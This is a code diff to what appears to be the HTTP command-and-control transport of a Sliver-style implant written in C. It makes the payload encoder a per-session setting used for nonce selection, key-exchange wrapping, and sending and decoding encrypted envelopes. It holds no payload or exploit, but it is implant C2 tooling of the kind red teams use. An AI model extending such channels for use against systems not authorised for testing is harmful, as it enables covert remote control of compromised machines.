@@ -30,6 +30,11 @@
 #include "sliver/transport.h"
 
 #define HTTP_SESSION_RECV_TIMEOUT_MS 15000
+
+/* Encoder used for every request/response of a session. NOP keeps the payload as
+ * raw bytes; switching to BASE64/HEX only requires the listener (or the offline
+ * stub) to select the same id, which sliver_encoder_pick_nonce guarantees. */
+#define SLIVER_HTTP_SESSION_ENCODER SLIVER_ENCODER_NOP
 #define HTTP_SESSION_MAX_RESPONSE (8u * 1024u * 1024u)
 
 int sliver_http_session_init(sliver_http_session_t *s, const char *host, uint16_t port,
@@ -43,6 +48,7 @@ int sliver_http_session_init(sliver_http_session_t *s, const char *host, uint16_
   s->use_tls = use_tls;
   (void)snprintf(s->base_path, sizeof(s->base_path), "%s",
                  base_path != NULL && base_path[0] != '\0' ? base_path : "/");
+  s->enc = SLIVER_HTTP_SESSION_ENCODER;
   s->poll_timeout_ns = sliver_config_poll_timeout_ns();
   if (s->poll_timeout_ns <= 0) {
     /* Default so an idle poll does not spin: the listener answers 204 at once
@@ -71,7 +77,7 @@ static void session_target(sliver_http_session_t *s, char *out, size_t cap) {
       prof.nonce_query_arg_chars[0] != '\0') {
     chars = prof.nonce_query_arg_chars;
   }
-  if (sliver_encoder_pick_nonce(SLIVER_ENCODER_NOP, &nonce) == 0 && nonce != 0) {
+  if (sliver_encoder_pick_nonce(s->enc, &nonce) == 0 && nonce != 0) {
     key = chars[nonce % strlen(chars)];
   }
   if (nonce == 0) {
@@ -327,7 +333,7 @@ int sliver_http_session_establish(sliver_http_session_t *s) {
     LOG_WARN("http-c2: age key exchange failed (are the age secrets injected?)");
     goto done;
   }
-  if (sliver_encoder_encode(SLIVER_ENCODER_NOP, wrapped, wrapped_len, &encoded,
+  if (sliver_encoder_encode(s->enc, wrapped, wrapped_len, &encoded,
                             &encoded_len) != 0) {
     goto done;
   }
@@ -370,7 +376,7 @@ int sliver_http_session_send(sliver_http_session_t *s, const void *envelope, siz
   if (sliver_cipher_encrypt(s->key, envelope, len, &cipher, &cipher_len) != 0) {
     return -1;
   }
-  if (sliver_encoder_encode(SLIVER_ENCODER_NOP, cipher, cipher_len, &encoded,
+  if (sliver_encoder_encode(s->enc, cipher, cipher_len, &encoded,
                             &encoded_len) != 0) {
     free(cipher);
     return -1;
@@ -433,7 +439,7 @@ int sliver_http_session_recv(sliver_http_session_t *s, sliver_buf_t *env_out) {
   {
     unsigned char *decoded = NULL;
     size_t decoded_len = 0;
-    if (sliver_encoder_decode(SLIVER_ENCODER_NOP, resp, resp_len, &decoded, &decoded_len) !=
+    if (sliver_encoder_decode(s->enc, resp, resp_len, &decoded, &decoded_len) !=
         0) {
       LOG_WARN("http-c2: poll body failed to decode");
       free(resp);
